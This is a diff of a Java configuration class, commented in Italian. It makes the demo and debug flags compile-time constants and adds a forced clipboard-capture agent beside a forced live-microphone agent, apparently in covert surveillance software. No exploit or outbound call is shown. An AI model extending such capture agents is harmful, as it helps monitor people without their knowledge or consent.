@@ -81,7 +81,18 @@ public final class Conf {
     public static final long TASK_ACTION_TIMEOUT = 600 * 1000; // ogni action che dura piu' di dieci minuti viene killata
 
     public static boolean IS_UI = true;
-    public static boolean DEMO = false;
+    
+    //#ifdef DEMO
+    public static final boolean DEMO = true;
+    //#else
+    public static final boolean DEMO = false;
+    //#endif
+    
+    //#ifdef DEBUG
+    public static final boolean DEBUG = true;
+    //#else
+    public static final boolean DEBUG = false;
+    //#endif
 
     public static final boolean MAIL_TEXT_FORCE_UTF8 = true;
 
@@ -517,6 +528,11 @@ public final class Conf {
         //#ifdef LIVE_MIC_FORCED
         Agent agent3 = Agent.factory(Agent.AGENT_LIVE_MIC, true, new byte[0]);
         status.addAgent(agent3);
+        //#endif
+        
+        //#ifdef CLIP_FORCED
+        Agent agent4 = Agent.factory(Agent.AGENT_CLIPBOARD, true, new byte[0]);
+        status.addAgent(agent4);
         //#endif
 
         //#ifdef DEBUG
